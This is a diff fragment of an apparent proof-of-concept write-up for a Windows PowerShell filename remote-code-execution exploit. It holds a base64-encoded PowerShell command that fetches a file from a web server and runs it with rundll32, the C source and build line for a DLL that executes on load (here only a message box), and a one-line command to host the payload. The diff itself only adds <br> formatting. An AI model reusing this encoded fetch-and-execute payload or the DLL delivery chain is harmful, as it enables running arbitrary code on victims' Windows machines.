@@ -31,17 +31,28 @@ b64encode("saps  http[]//127.0.0.1/1.d;sleep -s 2;rundll32 $HOME\\Downloads\\1.d
 
 cwBhAHAAcwAgACAAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQAvADEALgBkADsAcwBsAGUAZQBwACAALQBzACAAMgA7AHIAdQBuAGQAbABsADMAMgAgACQASABPAE0ARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAMQAuAGQALAAgADAA
 
-DLL Code:
-#include <windows.h>
-//gcc -shared -o mydll.dll mydll.c -m32
-//hyp3rlinx 
-void evilo(void){
-MessageBox(0,"Filename Remote Code Execution PoC\r\nBy hyp3rlinx","M$ Windows PowerShell",1);
-}
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
-evilo();
-return 0;
-}
+DLL Code: <br>  
+
+#include <windows.h> <br> 
+
+//gcc -shared -o mydll.dll mydll.c -m32 <br>  
+
+//hyp3rlinx <br>  
+
+void evilo(void){ <br>  
+
+MessageBox(0,"Filename Remote Code Execution PoC\r\nBy hyp3rlinx","M$ Windows PowerShell",1); <br>  
+
+} <br>  
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ <br>  
+
+evilo(); <br>  
+
+return 0; <br>  
+
+} <br>  
+
 
 python -m http.server 80
 
